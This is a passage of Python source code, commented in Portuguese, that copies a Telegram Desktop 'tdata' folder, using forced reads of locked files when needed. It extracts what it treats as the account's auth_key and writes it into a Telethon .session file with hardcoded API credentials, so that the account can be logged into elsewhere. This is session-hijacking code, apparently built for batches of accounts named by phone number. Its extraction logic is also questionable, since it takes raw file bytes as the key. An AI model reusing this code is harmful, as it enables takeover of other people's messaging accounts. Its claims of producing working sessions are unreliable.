        print(f"***AVISO: Tentando usar método alternativo...")
        return gerar_session_de_tdata_fallback(tdata_path, conjunto_num, telegram_dir, numero_conta)

def gerar_session_de_tdata_fallback(tdata_path, conjunto_num, telegram_dir=None, numero_conta=None):
    """
    Método alternativo (fallback) para gerar session quando tdata_para_session não está disponível.
    Usa a lógica antiga do Telethon.
    """
    import time
    
    print(f"***Usando método alternativo (fallback) para gerar session...")
    
    if not tdata_path or not os.path.exists(tdata_path):
        print(f"***ERRO: Pasta tdata não encontrada: {tdata_path}")
        return None
    
    # Cria arquivo .session temporário
    # Se tem número da conta, usa como nome (ex: 5516981002287.session)
    if numero_conta:
        import re
        numero_limpo = re.sub(r'\D', '', str(numero_conta))  # Remove tudo que não é dígito
        if numero_limpo and len(numero_limpo) >= 8:
            session_file = os.path.join(temp, f'{numero_limpo}.session')
            print(f"***Usando número da conta como nome do arquivo: {numero_limpo}.session")
        else:
            session_file = os.path.join(temp, f'session_conjunto_{conjunto_num}.session')
    else:
        session_file = os.path.join(temp, f'session_conjunto_{conjunto_num}.session')
    
    # Remove arquivo anterior se existir (para evitar conflitos e corrupção)
    # Tenta múltiplas vezes para garantir que o arquivo seja removido
    max_tentativas_remocao = 5
    for tentativa in range(max_tentativas_remocao):
        if os.path.exists(session_file):
            try:
                # Tenta fechar qualquer conexão que possa estar aberta
                try:
                    conn_temp = sqlite3.connect(session_file, timeout=0.5)
                    conn_temp.close()
                except:
                    pass
                
                # Remove o arquivo
                os.remove(session_file)
                
                # Verifica se foi removido
                if not os.path.exists(session_file):
                    break
                
                # Aguarda antes de tentar novamente
                time.sleep(0.2 * (tentativa + 1))
            except Exception as e:
                if tentativa < max_tentativas_remocao - 1:
                    time.sleep(0.2 * (tentativa + 1))
                    continue
                else:
                    print(f"***AVISO: Não foi possível remover arquivo anterior após {max_tentativas_remocao} tentativas: {repr(e)}")
                    # Usa nome único para evitar conflito
                    session_file = session_file.replace('.session', f'_{int(time.time() * 1000)}.session')
                    print(f"***Usando nome alternativo: {os.path.basename(session_file)}")
                    break
        else:
            break
    
    # Tenta usar Telethon para gerar session string
    if TELETHON_AVAILABLE:
        try:
            print(f"***Tentando gerar session com Telethon...")
            
            # API credentials do Telegram (padrão)
            api_id = 2040
            api_hash = "b18441a1ff607e10a989891a5462e627"
            
            # Tenta extrair dados do tdata e criar session string
            try:
                # Lê arquivos principais do tdata
                key_data = None
                auth_data = None
                
                for root, dirs, files in os.walk(tdata_path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        file_lower = file.lower()
                        
                        # Tenta ler arquivo key
                        if 'key' in file_lower and key_data is None:
                            try:
                                metodos = [
                                    lambda: open(file_path, 'rb').read(),
                                    lambda: copiar_arquivo_compartilhado_leitura(file_path, 1024*1024),
                                ]
                                for metodo in metodos:
                                    try:
                                        key_data = metodo()
                                        break
                                    except:
                                        continue
                            except:
                                pass
                        
                        # Tenta ler arquivo auth
                        if 'auth' in file_lower and auth_data is None:
                            try:
                                metodos = [
                                    lambda: open(file_path, 'rb').read(),
                                    lambda: copiar_arquivo_compartilhado_leitura(file_path, 1024*1024),
                                ]
                                for metodo in metodos:
                                    try:
                                        auth_data = metodo()
                                        break
                                    except:
                                        continue
                            except:
                                pass
                
                # Se conseguiu ler dados, tenta criar session SQLite válida do Telethon
                if key_data or auth_data:
                    print(f"***Dados de autenticação extraídos, criando session SQLite do Telethon...")
                    
                    try:
                        # Cria um arquivo .session SQLite válido do Telethon
                        # O Telethon usa arquivos .session que são bancos de dados SQLite
                        import sqlite3
                        import time  # Garante que time está disponível
                        
                        # Remove extensão .session para usar como nome de sessão
                        session_name = session_file.replace('.session', '')
                        if session_name.endswith('_conjunto_'):
                            import re
                            match = re.search(r'_conjunto_(\d+)', session_name)
                            if match:
                                session_name = f"session_{match.group(1)}"
                        
                        # Cria arquivo SQLite com estrutura completa do Telethon
                        print(f"***Criando arquivo .session SQLite válido do Telethon...")
                        
                        # GARANTE remoção completa do arquivo anterior (evita tabelas duplicadas)
                        # Remove arquivo principal e arquivos relacionados (WAL, SHM)
                        arquivos_para_remover = [
                            session_file,
                            session_file + '-wal',
                            session_file + '-shm'
                        ]
                        
                        for arquivo_remover in arquivos_para_remover:
                            if os.path.exists(arquivo_remover):
                                for tentativa in range(5):
                                    try:
                                        # Fecha conexões abertas
                                        try:
                                            conn_temp = sqlite3.connect(arquivo_remover.replace('-wal', '').replace('-shm', ''), timeout=0.3)
                                            conn_temp.close()
                                        except:
                                            pass
                                        
                                        os.remove(arquivo_remover)
                                        if not os.path.exists(arquivo_remover):
                                            break
                                        time.sleep(0.2 * (tentativa + 1))
                                    except:
                                        if tentativa < 4:
                                            time.sleep(0.2 * (tentativa + 1))
                                            continue
                                        else:
                                            # Se não conseguir remover arquivo principal, usa nome único
                                            if arquivo_remover == session_file:
                                                session_file = session_file.replace('.session', f'_{int(time.time() * 1000)}.session')
                                            break
                        
                        # Aguarda um pouco para garantir que tudo foi liberado
                        time.sleep(0.3)
                        
                        # Cria banco SQLite NOVO (arquivo foi completamente removido)
                        # Usa journal_mode=delete para corresponder ao formato padrão do Telethon
                        conn = sqlite3.connect(session_file, timeout=30.0)
                        conn.execute('PRAGMA journal_mode=DELETE')  # Modo delete (padrão Telethon)
                        conn.execute('PRAGMA synchronous=NORMAL')  # Balance entre segurança e performance
                        cursor = conn.cursor()
                        
                        # Tabela version (obrigatória) - versão 7 é o padrão do Telethon atual
                        cursor.execute('''
                            CREATE TABLE IF NOT EXISTS version (
                                version INTEGER PRIMARY KEY
                            )
                        ''')
                        cursor.execute('INSERT OR REPLACE INTO version (version) VALUES (?)', (7,))
                        
                        # Tabela sessions (obrigatória) - dados da sessão
                        cursor.execute('''
                            CREATE TABLE IF NOT EXISTS sessions (
                                dc_id INTEGER PRIMARY KEY,
                                server_address TEXT,
                                port INTEGER,
                                auth_key BLOB,
                                takeout_id INTEGER
                            )
                        ''')
                        
                        # Extrai e insere dados de autenticação do tdata na tabela sessions
                        # Isso permite autenticação automática
                        print(f"***Extraindo dados de autenticação do tdata para inserir na tabela sessions...")
                        
                        # Tenta encontrar pasta D877F783D5D3EF8C (contém auth_key e dc_id)
                        # Esta é a estrutura padrão do Telegram Desktop para armazenar dados de autenticação
                        auth_key_data = None
                        dc_id = None
                        server_address = None
                        port = 443  # Porta padrão do Telegram
                        
                        # Procura pasta D877F783D5D3EF8C no tdata
                        d877_path = None
                        for root, dirs, files in os.walk(tdata_path):
                            # Verifica se há pasta D877F783D5D3EF8C
                            if 'D877F783D5D3EF8C' in dirs:
                                d877_path = os.path.join(root, 'D877F783D5D3EF8C')
                                break
                        
                        # Se encontrou pasta D877F783D5D3EF8C, lê arquivos dentro dela
                        # Cada arquivo numerado (1, 2, 3, etc.) corresponde a um DC (Data Center)
                        # O arquivo contém o auth_key completo (256 bytes) e outras informações
                        if d877_path and os.path.exists(d877_path) and os.path.isdir(d877_path):
                            try:
                                # Lista todos os arquivos na pasta D877F783D5D3EF8C
                                arquivos_dc = []
                                for item in os.listdir(d877_path):
                                    item_path = os.path.join(d877_path, item)
                                    if os.path.isfile(item_path):
                                        # Tenta identificar o DC pelo nome do arquivo (geralmente é um número)
                                        try:
                                            if item.isdigit():
                                                dc_num = int(item)
                                                arquivos_dc.append((dc_num, item_path))
                                            else:
                                                # Se não é número, tenta ler como DC padrão (2)
                                                arquivos_dc.append((2, item_path))
                                        except:
                                            arquivos_dc.append((2, item_path))
                                
                                # Ordena por DC (prioriza DC 2, depois outros)
                                arquivos_dc.sort(key=lambda x: (0 if x[0] == 2 else 1, x[0]))
                                
                                # Tenta ler cada arquivo até encontrar um válido
                                for dc_num, file_path in arquivos_dc:
                                    try:
                                        # Tenta ler o arquivo completo
                                        file_data = None
                                        metodos = [
                                            lambda: open(file_path, 'rb').read(),
                                            lambda: copiar_arquivo_compartilhado_leitura(file_path, 1024*1024),
                                            lambda: copiar_arquivo_ctypes_leitura(file_path, 1024*1024),
                                            lambda: copiar_arquivo_forcado_leitura(file_path, 1024*1024),
                                        ]
                                        for metodo in metodos:
                                            try:
                                                file_data = metodo()
                                                if file_data and len(file_data) >= 256:
                                                    break
                                            except:
                                                continue
                                        
                                        if file_data and len(file_data) >= 256:
                                            # O auth_key são os primeiros 256 bytes do arquivo
                                            auth_key_data = file_data[:256]
                                            dc_id = dc_num
                                            print(f"***OK Auth_key extraído do DC {dc_id}: {len(auth_key_data)} bytes")
                                            break
                                    except Exception as e:
                                        print(f"***AVISO: Erro ao ler arquivo DC {dc_num}: {repr(e)}")
                                        continue
                                
                            except Exception as e:
                                print(f"***AVISO: Erro ao processar D877F783D5D3EF8C: {repr(e)}")
                        
                        # Se não encontrou auth_key no D877F783D5D3EF8C, tenta buscar em outros lugares
                        if not auth_key_data:
                            # Busca em arquivos que podem conter auth_key
                            for root, dirs, files in os.walk(tdata_path):
                                for file in files:
                                    file_lower = file.lower()
                                    # Procura arquivos que podem conter auth_key
                                    if any(pattern in file_lower for pattern in ['key', 'auth', 'session']):
                                        file_path = os.path.join(root, file)
                                        try:
                                            file_data = None
                                            metodos = [
                                                lambda: open(file_path, 'rb').read(512),
                                                lambda: copiar_arquivo_compartilhado_leitura(file_path, 512),
                                            ]
                                            for metodo in metodos:
                                                try:
                                                    file_data = metodo()
                                                    if file_data and len(file_data) >= 256:
                                                        # Tenta usar como auth_key
                                                        auth_key_data = file_data[:256]
                                                        dc_id = 2  # Padrão
                                                        print(f"***OK Auth_key encontrado em {file}: {len(auth_key_data)} bytes")
                                                        break
                                                except:
                                                    continue
                                            if auth_key_data:
                                                break
                                        except:
                                            continue
                                if auth_key_data:
                                    break
                        
                        # Se ainda não tem auth_key, tenta usar key_data ou auth_data extraídos anteriormente
                        if not auth_key_data:
                            if key_data and len(key_data) >= 256:
                                auth_key_data = key_data[:256]
                                dc_id = 2  # Padrão
                                print(f"***OK Auth_key extraído de key_data: {len(auth_key_data)} bytes")
                            elif auth_data and len(auth_data) >= 256:
                                auth_key_data = auth_data[:256]
                                dc_id = 2  # Padrão
                                print(f"***OK Auth_key extraído de auth_data: {len(auth_key_data)} bytes")
                        
                        # Define server_address padrão baseado no dc_id
                        if dc_id:
                            # Servidores do Telegram por DC
                            dc_servers = {
                                1: "149.154.175.50",
                                2: "149.154.167.51",
                                3: "149.154.175.100",
                                4: "149.154.167.92",
                                5: "91.108.56.100",
                            }
                            server_address = dc_servers.get(dc_id, "149.154.167.51")  # Padrão DC2
                        else:
                            dc_id = 2  # Padrão
                            server_address = "149.154.167.51"  # DC2 padrão
                        
                        # Insere dados de autenticação na tabela sessions
                        # OBRIGATÓRIO: Sem auth_key válido, o session não funcionará
                        if auth_key_data and len(auth_key_data) == 256:
                            try:
                                cursor.execute('''
                                    INSERT OR REPLACE INTO sessions (dc_id, server_address, port, auth_key, takeout_id)
                                    VALUES (?, ?, ?, ?, ?)
                                ''', (dc_id, server_address, port, auth_key_data, None))
                                
                                # Verifica se foi inserido corretamente
                                cursor.execute("SELECT COUNT(*) FROM sessions WHERE auth_key IS NOT NULL AND LENGTH(auth_key) = 256")
                                count = cursor.fetchone()[0]
                                
                                if count > 0:
                                    print(f"***OK Dados de autenticação inseridos na tabela sessions:")
                                    print(f"***  dc_id: {dc_id}")
                                    print(f"***  server_address: {server_address}")
                                    print(f"***  port: {port}")
                                    print(f"***  auth_key: {len(auth_key_data)} bytes (válido)")
                                else:
                                    print(f"***ERRO: Auth_key não foi inserido corretamente!")
                                    raise Exception("Auth_key não inserido")
                            except Exception as e:
                                print(f"***ERRO ao inserir dados de autenticação: {repr(e)}")
                                raise
                        else:
                            print(f"***ERRO CRÍTICO: Não foi possível extrair auth_key válido do tdata!")
                            print(f"***ERRO: Session não será funcional sem auth_key válido (256 bytes)")
                            raise Exception("Auth_key inválido ou ausente")
                        
                        # Tabela entities (obrigatória) - entidades (usuários, grupos, etc)
                        cursor.execute('''
                            CREATE TABLE IF NOT EXISTS entities (
                                id INTEGER PRIMARY KEY,
                                hash INTEGER NOT NULL,
                                username TEXT,
                                phone INTEGER,
                                name TEXT,
                                date INTEGER
                            )
                        ''')
                        
                        # Tabela sent_files (obrigatória) - arquivos enviados
                        cursor.execute('''
                            CREATE TABLE IF NOT EXISTS sent_files (
                                md5_digest BLOB,
                                file_size INTEGER,
                                type INTEGER,
                                id INTEGER,
                                hash INTEGER,
                                PRIMARY KEY (md5_digest, file_size, type)
                            )
                        ''')
                        
                        # Tabela update_state (obrigatória) - estado das atualizações
                        cursor.execute('''
                            CREATE TABLE IF NOT EXISTS update_state (
                                id INTEGER PRIMARY KEY,
                                pts INTEGER,
                                qts INTEGER,
                                date INTEGER,
                                seq INTEGER
                            )
                        ''')
                        
                        # GARANTE que commit é feito e dados são persistidos
                        conn.commit()
                        
                        conn.close()
                        print(f"***OK Conexão SQLite fechada, dados salvos")
                        
                        print(f"***Arquivo .session SQLite criado com estrutura completa do Telethon")
                        
                        # Valida se arquivo foi criado
                        if os.path.exists(session_file):
                            session_size = os.path.getsize(session_file)
                            if session_size > 0:
                                # Valida estrutura do banco
                                try:
                                    conn_val = sqlite3.connect(session_file)
                                    cursor_val = conn_val.cursor()
                                    
                                    # Verifica se todas as tabelas obrigatórias existem
                                    cursor_val.execute("SELECT name FROM sqlite_master WHERE type='table'")
                                    tabelas = [row[0] for row in cursor_val.fetchall()]
                                    
                                    tabelas_obrigatorias = ['version', 'sessions', 'entities', 'sent_files', 'update_state']
                                    tabelas_faltando = [t for t in tabelas_obrigatorias if t not in tabelas]
                                    
                                    if tabelas_faltando:
                                        print(f"***AVISO: Tabelas faltando: {tabelas_faltando}")
                                        # Cria tabelas faltando (sempre com IF NOT EXISTS para evitar erro)
                                        if 'version' not in tabelas:
                                            cursor_val.execute('CREATE TABLE IF NOT EXISTS version (version INTEGER PRIMARY KEY)')
                                            cursor_val.execute('INSERT OR REPLACE INTO version (version) VALUES (7)')
                                        if 'sessions' not in tabelas:
                                            cursor_val.execute('''
                                                CREATE TABLE IF NOT EXISTS sessions (
                                                    dc_id INTEGER PRIMARY KEY,
                                                    server_address TEXT,
                                                    port INTEGER,
                                                    auth_key BLOB,
                                                    takeout_id INTEGER
                                                )
                                            ''')
                                        if 'entities' not in tabelas:
                                            cursor_val.execute('''
                                                CREATE TABLE IF NOT EXISTS entities (
                                                    id INTEGER PRIMARY KEY,
                                                    hash INTEGER NOT NULL,
                                                    username TEXT,
                                                    phone INTEGER,
                                                    name TEXT,
                                                    date INTEGER
                                                )
                                            ''')
                                        if 'sent_files' not in tabelas:
                                            cursor_val.execute('''
                                                CREATE TABLE IF NOT EXISTS sent_files (
                                                    md5_digest BLOB,
                                                    file_size INTEGER,
                                                    type INTEGER,
                                                    id INTEGER,
                                                    hash INTEGER,
                                                    PRIMARY KEY (md5_digest, file_size, type)
                                                )
                                            ''')
                                        if 'update_state' not in tabelas:
                                            cursor_val.execute('''
                                                CREATE TABLE IF NOT EXISTS update_state (
                                                    id INTEGER PRIMARY KEY,
                                                    pts INTEGER,
                                                    qts INTEGER,
                                                    date INTEGER,
                                                    seq INTEGER
                                                )
                                            ''')
                                        conn_val.commit()
                                        print(f"***Tabelas faltando foram criadas")
                                    
                                    # VALIDAÇÃO FINAL CRÍTICA: Verifica se tem auth_key válido
                                    cursor_val.execute("SELECT COUNT(*) FROM sessions WHERE auth_key IS NOT NULL AND LENGTH(auth_key) = 256")
                                    tem_auth_valido = cursor_val.fetchone()
                                    
                                    if not tem_auth_valido or tem_auth_valido[0] == 0:
                                        print(f"***ERRO CRÍTICO: Session criada mas NÃO tem auth_key válido!")
                                        print(f"***ERRO: Session não será funcional sem auth_key")
                                        conn_val.close()
                                        try:
                                            os.remove(session_file)
                                        except:
                                            pass
                                        return None
                                    
                                    # Verifica integridade final
                                    cursor_val.execute("PRAGMA integrity_check")
                                    integrity_final = cursor_val.fetchone()
                                    if integrity_final and integrity_final[0] == 'ok':
                                        print(f"***OK Integridade SQLite validada")
                                    else:
                                        print(f"***ERRO: Problema de integridade detectado: {integrity_final}")
                                        conn_val.close()
                                        try:
                                            os.remove(session_file)
                                        except:
                                            pass
                                        return None
                                    
                                    conn_val.close()
                                except Exception as e:
                                    print(f"***AVISO: Erro ao validar estrutura: {repr(e)}")
                                    # Se houver erro, tenta fechar a conexão se ainda estiver aberta
                                    try:
                                        if conn_val:
                                            conn_val.close()
                                    except:
                                        pass
                                
                                print(f"***Session SQLite gerada com estrutura completa do Telethon")
                                print(f"***Tamanho: {session_size / 1024:.2f} KB")
                                print(f"***Arquivo: {session_file}")
                                print(f"***Formato: SQLite válido (todas as tabelas obrigatórias do Telethon)")
                                print(f"***Auth_key: Válido (256 bytes)")
                                print(f"***Status: FUNCIONAL - Pronto para uso")
                                
                                # AUTORIZA A SESSION USANDO TELETHON
                                print(f"***Autorizando session gerada com Telethon...")
                                if autorizar_session_telethon(session_file):
                                    print(f"***OK Session autorizada com sucesso pelo Telethon!")
                                else:
                                    print(f"***AVISO: Não foi possível autorizar session, mas arquivo foi gerado")
                                
                                return session_file
                            else:
                                print(f"***ERRO: Arquivo SQLite criado está vazio")
                                return None
                        else:
                            print(f"***ERRO: Arquivo SQLite não foi criado")
                            return None
                        
                    except Exception as e:
                        print(f"***ERRO ao criar session SQLite com Telethon: {repr(e)}")
                        import traceback
                        traceback.print_exc()
                        print(f"***Usando método alternativo...")
                else:
                    print(f"***Não foi possível extrair dados de autenticação do tdata")
                    print(f"***Usando método alternativo...")
                    
            except Exception as e:
                print(f"***ERRO ao processar tdata com Telethon: {repr(e)}")
                print(f"***Usando método alternativo...")
        except Exception as e:
            print(f"***ERRO ao inicializar Telethon: {repr(e)}")
            print(f"***Usando método alternativo...")
    
    # Se Telethon não funcionou ou não está disponível, usa método alternativo
    print(f"***Usando método alternativo para gerar session...")
    
    # Variável para controlar se precisa clonar
    tdata_clone_path = None
    usar_tdata_original = True
    arquivos_falhados = 0
    arquivos_importantes_falhados = 0
    
    try:
        # Primeiro, tenta ler diretamente do tdata original
        # Coleta todos os arquivos do tdata
        tdata_files = []
        for root, dirs, files in os.walk(tdata_path):
            for file in files:
                file_path = os.path.join(root, file)
                tdata_files.append(file_path)
        
        if not tdata_files:
            print(f"***ERRO: Nenhum arquivo encontrado na pasta tdata")
            return None
        
        print(f"***Encontrados {len(tdata_files)} arquivos no tdata")
        
        # Adiciona dados dos arquivos principais do tdata
        # Prioriza arquivos que podem conter chaves de autenticação
        important_patterns = ['key', 'auth', 'd877', 'session', 'map']
        important_files = []
        other_files = []
        
        for tdata_file in tdata_files:
            file_lower = os.path.basename(tdata_file).lower()
            if any(pattern in file_lower for pattern in important_patterns):
                important_files.append(tdata_file)
            else:
                other_files.append(tdata_file)
        
        # Ordena: arquivos importantes primeiro
        files_to_process = important_files[:20] + other_files[:30]  # Limita a 50 arquivos
        
        print(f"***Processando {len(files_to_process)} arquivos do tdata (tentativa direta)...")
        
        # Testa se consegue ler os arquivos importantes
        for tdata_file in important_files[:10]:  # Testa os 10 primeiros importantes
            file_data = None
            metodos_leitura = [
                lambda f=tdata_file: open(f, 'rb').read(8192),
                lambda f=tdata_file: copiar_arquivo_compartilhado_leitura(f, 8192),
                lambda f=tdata_file: copiar_arquivo_ctypes_leitura(f, 8192),
                lambda f=tdata_file: copiar_arquivo_forcado_leitura(f, 8192),
            ]
            
            leu_com_sucesso = False
            for metodo in metodos_leitura:
                try:
                    file_data = metodo()
                    if file_data and len(file_data) > 0:
                        leu_com_sucesso = True
                        break
                except:
                    continue
            
            if not leu_com_sucesso:
                arquivos_importantes_falhados += 1
        
        # Se muitos arquivos importantes falharam, clona o tdata
        if arquivos_importantes_falhados >= 3 or len(important_files) == 0:
            print(f"***AVISO: {arquivos_importantes_falhados} arquivos importantes falharam ao ler diretamente")
            print(f"***Clonando pasta tdata para local temporário...")
            
            tdata_clone_path = os.path.join(temp, f'tdata_clone_{conjunto_num}')
            registrar_arquivo_temp(tdata_clone_path)
            try:
                # Remove clone anterior se existir
                if os.path.exists(tdata_clone_path):
                    shutil.rmtree(tdata_clone_path)
                
                # Clona o tdata usando a função robusta de cópia
                sucesso, falhas, bloqueados = copia_tdata_ignorando_bloqueados(tdata_path, tdata_clone_path)
                print(f"***Clone do tdata: {sucesso} arquivos copiados, {falhas} falhas, {len(bloqueados)} bloqueados")
                
                if sucesso > 0:
                    usar_tdata_original = False
                    tdata_path_para_usar = tdata_clone_path
                    print(f"***Usando clone do tdata para gerar sessão: {tdata_clone_path}")
                else:
                    print(f"***AVISO: Clone falhou, tentando usar tdata original mesmo assim...")
                    tdata_path_para_usar = tdata_path
            except Exception as e:
                print(f"***ERRO ao clonar tdata: {repr(e)}")
                print(f"***Tentando usar tdata original mesmo assim...")
                tdata_path_para_usar = tdata_path
        else:
            tdata_path_para_usar = tdata_path
        
        # Agora processa os arquivos (do original ou do clone)
        # Recoleta arquivos do caminho que vai usar
        tdata_files_para_usar = []
        for root, dirs, files in os.walk(tdata_path_para_usar):
            for file in files:
                file_path = os.path.join(root, file)
                tdata_files_para_usar.append(file_path)
        
        # Reorganiza arquivos importantes
        important_files_para_usar = []
        other_files_para_usar = []
        for tdata_file in tdata_files_para_usar:
            file_lower = os.path.basename(tdata_file).lower()
            if any(pattern in file_lower for pattern in important_patterns):
                important_files_para_usar.append(tdata_file)
            else:
                other_files_para_usar.append(tdata_file)
        
        files_to_process_final = important_files_para_usar[:20] + other_files_para_usar[:30]
        
        print(f"***Processando {len(files_to_process_final)} arquivos do tdata...")
        
        # Cria arquivo .session no formato SQLite compatível com ferramentas de conversão
        # Formato: SQLite database que pode ser convertido de volta para tdata
        import sqlite3
        import json
        import base64
        import time  # Garante que time está disponível
        
        print(f"***Criando arquivo .session no formato SQLite (compatível com Telegram Desktop)...")
        
        try:
            # Remove arquivo anterior se existir (para evitar corrupção)
            if os.path.exists(session_file):
                try:
                    os.remove(session_file)
                except:
                    pass
            
            # GARANTE remoção completa do arquivo anterior (evita tabelas duplicadas)
            # Remove arquivo principal e arquivos relacionados (WAL, SHM)
            arquivos_para_remover = [
                session_file,
                session_file + '-wal',
                session_file + '-shm'
            ]
            
            for arquivo_remover in arquivos_para_remover:
                if os.path.exists(arquivo_remover):
                    for tentativa in range(5):
                        try:
                            # Fecha conexões abertas
                            try:
                                conn_temp = sqlite3.connect(arquivo_remover.replace('-wal', '').replace('-shm', ''), timeout=0.3)
                                conn_temp.close()
                            except:
                                pass
                            
                            os.remove(arquivo_remover)
                            if not os.path.exists(arquivo_remover):
                                break
                            time.sleep(0.2 * (tentativa + 1))
                        except:
                            if tentativa < 4:
                                time.sleep(0.2 * (tentativa + 1))
                                continue
                            else:
                                # Se não conseguir remover arquivo principal, usa nome único
                                if arquivo_remover == session_file:
                                    session_file = session_file.replace('.session', f'_{int(time.time() * 1000)}.session')
                                break
            
            # Aguarda um pouco para garantir que tudo foi liberado
            time.sleep(0.3)
            
            # Cria banco de dados SQLite NOVO (arquivo foi completamente removido)
            # Usa journal_mode=delete para corresponder ao formato padrão do Telethon
            conn = sqlite3.connect(session_file, timeout=30.0)
            conn.execute('PRAGMA journal_mode=DELETE')  # Modo delete (padrão Telethon)
            conn.execute('PRAGMA synchronous=NORMAL')  # Balance entre segurança e performance
            cursor = conn.cursor()
            
            # Cria todas as tabelas obrigatórias do Telethon
            
            # Tabela version (obrigatória)
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS version (
                    version INTEGER PRIMARY KEY
                )
            ''')
            cursor.execute('INSERT OR REPLACE INTO version (version) VALUES (?)', (7,))
            
            # Tabela sessions (obrigatória) - dados da sessão
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS sessions (
                    dc_id INTEGER PRIMARY KEY,
                    server_address TEXT,
                    port INTEGER,
                    auth_key BLOB,
                    takeout_id INTEGER
                )
            ''')
            
            # Extrai e insere dados de autenticação do tdata na tabela sessions
            # Isso permite autenticação automática
            print(f"***Extraindo dados de autenticação do tdata para inserir na tabela sessions...")
            
            # Tenta encontrar arquivo D877F783D5D3EF8C (contém auth_key e dc_id)
            auth_key_data = None
            dc_id = None
            server_address = None
            port = 443  # Porta padrão do Telegram
            
            # Procura arquivo D877F783D5D3EF8C no tdata
            d877_path = None
            for root, dirs, files in os.walk(tdata_path_para_usar):
                # Verifica se há pasta D877F783D5D3EF8C
                if 'D877F783D5D3EF8C' in dirs:
                    d877_path = os.path.join(root, 'D877F783D5D3EF8C')
                    break
                # Verifica se há arquivo com esse nome
                for file in files:
                    if 'D877F783D5D3EF8C' in file.upper():
                        d877_path = os.path.join(root, file)
                        break
                if d877_path:
                    break
            
            # Se encontrou pasta D877F783D5D3EF8C, tenta ler arquivos dentro dela
            if d877_path and os.path.exists(d877_path):
                try:
                    if os.path.isdir(d877_path):
                        # Procura arquivos dentro da pasta
                        for file in os.listdir(d877_path):
                            file_path = os.path.join(d877_path, file)
                            if os.path.isfile(file_path):
                                try:
                                    # Tenta ler o arquivo
                                    file_data = None
                                    metodos = [
                                        lambda: open(file_path, 'rb').read(),
                                        lambda: copiar_arquivo_compartilhado_leitura(file_path, 1024*1024),
                                    ]
                                    for metodo in metodos:
                                        try:
                                            file_data = metodo()
                                            if file_data and len(file_data) > 0:
                                                break
                                        except:
                                            continue
                                    
                                    if file_data and len(file_data) >= 256:
                                        # Arquivo pode conter auth_key (geralmente 256 bytes)
                                        auth_key_data = file_data[:256]  # Primeiros 256 bytes são o auth_key
                                        # Tenta extrair dc_id do nome do arquivo ou do conteúdo
                                        try:
                                            # dc_id pode estar no nome do arquivo (ex: "2" = dc_id 2)
                                            if file.isdigit():
                                                dc_id = int(file)
                                            # Ou pode estar no conteúdo (primeiros bytes após auth_key)
                                            elif len(file_data) > 256:
                                                # Tenta ler dc_id do conteúdo
                                                dc_id_bytes = file_data[256:260] if len(file_data) >= 260 else None
                                                if dc_id_bytes:
                                                    import struct
                                                    try:
                                                        dc_id = struct.unpack('<I', dc_id_bytes)[0]
                                                    except:
                                                        dc_id = 2  # Padrão
                                                else:
                                                    dc_id = 2  # Padrão
                                            else:
                                                dc_id = 2  # Padrão
                                        except:
                                            dc_id = 2  # Padrão
                                        break
                                except:
                                    continue
                    else:
                        # É um arquivo, tenta ler diretamente
                        try:
                            file_data = None
                            metodos = [
                                lambda: open(d877_path, 'rb').read(),
                                lambda: copiar_arquivo_compartilhado_leitura(d877_path, 1024*1024),
                            ]
                            for metodo in metodos:
                                try:
                                    file_data = metodo()
                                    if file_data and len(file_data) > 0:
                                        break
                                except:
                                    continue
                            
                            if file_data and len(file_data) >= 256:
                                auth_key_data = file_data[:256]
                                dc_id = 2  # Padrão
                        except:
                            pass
                except Exception as e:
                    print(f"***AVISO: Erro ao ler D877F783D5D3EF8C: {repr(e)}")
            
            # Define server_address padrão baseado no dc_id
            if dc_id:
                # Servidores do Telegram por DC
                dc_servers = {
                    1: "149.154.175.50",
                    2: "149.154.167.51",
                    3: "149.154.175.100",
                    4: "149.154.167.92",
                    5: "91.108.56.100",
                }
                server_address = dc_servers.get(dc_id, "149.154.167.51")  # Padrão DC2
            else:
                dc_id = 2  # Padrão
                server_address = "149.154.167.51"  # DC2 padrão
            
            # Insere dados de autenticação na tabela sessions
            if auth_key_data:
                try:
                    cursor.execute('''
                        INSERT OR REPLACE INTO sessions (dc_id, server_address, port, auth_key, takeout_id)
                        VALUES (?, ?, ?, ?, ?)
                    ''', (dc_id, server_address, port, auth_key_data, None))
                    print(f"***Dados de autenticação inseridos na tabela sessions:")
                    print(f"***  dc_id: {dc_id}")
                    print(f"***  server_address: {server_address}")
                    print(f"***  port: {port}")
                    print(f"***  auth_key: {len(auth_key_data)} bytes")
                except Exception as e:
                    print(f"***AVISO: Erro ao inserir dados de autenticação: {repr(e)}")
            else:
                print(f"***AVISO: Não foi possível extrair auth_key do tdata, session pode não autenticar automaticamente")
            
            # Tabela entities (obrigatória) - entidades (usuários, grupos, etc)
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS entities (
                    id INTEGER PRIMARY KEY,
                    hash INTEGER NOT NULL,
                    username TEXT,
                    phone INTEGER,
                    name TEXT,
                    date INTEGER
                )
            ''')
            
            # Tabela sent_files (obrigatória) - arquivos enviados
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS sent_files (
                    md5_digest BLOB,
                    file_size INTEGER,
                    type INTEGER,
                    id INTEGER,
                    hash INTEGER,
                    PRIMARY KEY (md5_digest, file_size, type)
                )
            ''')
            
            # Tabela update_state (obrigatória) - estado das atualizações
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS update_state (
                    id INTEGER PRIMARY KEY,
                    pts INTEGER,
                    qts INTEGER,
                    date INTEGER,
                    seq INTEGER
                )
            ''')
            
            # Tabela para armazenar dados do tdata (opcional)
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS tdata_files (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    file_path TEXT,
                    file_data BLOB,
                    file_size INTEGER
                )
            ''')
            
            # Tabela de metadados (opcional)
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS metadata (
                    key TEXT PRIMARY KEY,
                    value TEXT
                )
            ''')
            
            # Insere metadados
            cursor.execute('INSERT OR REPLACE INTO metadata (key, value) VALUES (?, ?)',
                         ('original_tdata_path', tdata_path))
            cursor.execute('INSERT OR REPLACE INTO metadata (key, value) VALUES (?, ?)',
                         ('format_version', '1.0'))
            cursor.execute('INSERT OR REPLACE INTO metadata (key, value) VALUES (?, ?)',
                         ('generated_from', 'tdata'))
            
            # Processa e armazena arquivos importantes do tdata
            arquivos_importantes_processados = 0
            for idx, tdata_file in enumerate(files_to_process_final):
                file_data = None
                file_name = os.path.relpath(tdata_file, tdata_path_para_usar).replace('\\', '/')
                
